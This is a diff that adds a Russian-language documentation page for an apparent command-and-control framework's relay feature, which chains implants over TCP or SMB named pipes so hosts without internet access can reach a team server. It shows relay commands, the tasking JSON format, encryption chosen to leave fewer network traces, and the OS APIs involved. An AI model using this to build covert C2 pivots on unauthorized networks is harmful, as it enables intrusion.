@@ -1,0 +1,118 @@
+---
+title: Реле
+---
+
+import { Step, Steps } from 'fumadocs-ui/components/steps';
+
+Relay — возможность импланта, позволяющая имплантам обмениваться данными внутри сети. Полезно, если у хоста нет интернета или сеть жёстко ограничена.
+
+Поддерживаются **SMB** и **TCP**. SMB — только Windows.
+
+## Использование
+
+Пример:
+
+На хосте A в сети есть хост B без выхода наружу — он не достучится до team server напрямую.
+
+Действия:
+
+  <Steps>
+    <Step>
+      ### Преднастроенный имплант
+      На B должен работать имплант с заранее настроенным relay.
+
+      Сборка — [Relay stageless implant](/docs/client/implants/creation#relay-stageless-implant)
+    </Step>
+    <Step>
+      ### Relay на хосте A
+
+      TCP relay:
+        ```
+        relay create --listen 8888 --target implant://192.168.15.10:9090 --channel tcp
+        ```
+      SMB relay (только Windows):
+        ```
+        relay create -l 445 --target server://192.168.15.10:9090 -c smb --pipe test --tls
+        ```
+    Параметры:
+        - `--listen` / `-l`: порт прослушивания (по умолчанию же relay id)
+        - `--target` / `-t`: нижестоящая точка — `implant://host:port` или `server://host:port`
+        - `--channel` / `-c`: `tcp` или `smb`
+        - `--pipe`: именованный канал SMB — короткое имя (`test`) или `\\pipe\\name` в Windows
+        - `--tls`: для `server://` — POST на team server по HTTPS вместо HTTP
+        - `--id`: id для `relay delete` или замена id порта по умолчанию
+    </Step>
+    <Step>
+      ### Управление
+      `relay` без аргументов — список активных relay (порт, цель, режим, статус).
+
+      Остановка:
+        ```
+        relay delete --id 8888
+        ```
+    </Step>
+    <Step>
+      ### Проверка
+      После настройки имплант B должен работать полностью.
+    </Step>
+  </Steps>
+
+
+### Префикс target
+
+`target` всегда с префиксом `implant://` или `server://` — имплант знает, когда обернуть трафик в HTTP для team server.
+
+Следующий hop — team server: `server://` (выход). Другой имплант: `implant://`.
+
+### Накопление задержки
+
+Relay учитывает delay каждого импланта. Через несколько хостов задержки складываются, отклик может сильно замедлиться.
+
+## Принцип работы
+
+После создания relay слушает настроенный порт.
+
+Входящий трафик: расшифровка, добавление host tag в `chain`, шифрование, пересылка на target.
+
+Структура JSON:
+
+```json
+{
+  "source": "hostB",
+  "content": [
+    {
+      "option": "output",
+      "type": "terminal",
+      "task_tag": "k7F2a9",
+      "output": "desktop\\user\r\n"
+    }
+  ],
+  "chain": ["hostB", "hostA"]
+}
+```
+
+Target — имплант: payload без изменений. Target — team server: трафик преобразуется в HTTP и уходит выше.
+
+### Шифрование
+
+Relay-трафик шифруется мастер-ключом AES из импланта при сборке. Один team server — один ключ.
+
+Handshake для обмена ключами не нужен — меньше характерного трафика.
+
+Смена ключа: `server.conf`, секция `[implants]`, параметр `relay_aes_key` (не менее 32 байт после декодирования, base64 или hex). Затем пересоберите импланты.
+
+**Важно:** новый ключ отключит импланты со старым.
+
+### Windows
+
+- **TCP**: `WSAStartup`, `socket`, `bind`, `listen`, `accept`, `connect`, `send`, `recv`, `closesocket`, `getaddrinfo`, `freeaddrinfo` из `ws2_32.dll`.
+
+- **SMB**: `CreateNamedPipeA`, `ConnectNamedPipe`, `CreateFileA`, `WaitNamedPipeA`, `PeekNamedPipe`, `ReadFile`, `WriteFile`, `DisconnectNamedPipe`, `CloseHandle` из `kernel32.dll`.
+
+### Linux
+
+POSIX-сокеты (`sys/socket.h`): `socket`, `bind`, `listen`, `accept`, `connect`, `send`, `recv`, `setsockopt`, `getaddrinfo`, `freeaddrinfo`. SMB нет.
+
+### macOS
+
+`net.Listen`, `net.Accept`, `net.Dial`, `io.Copy` (Go stdlib). SMB нет.
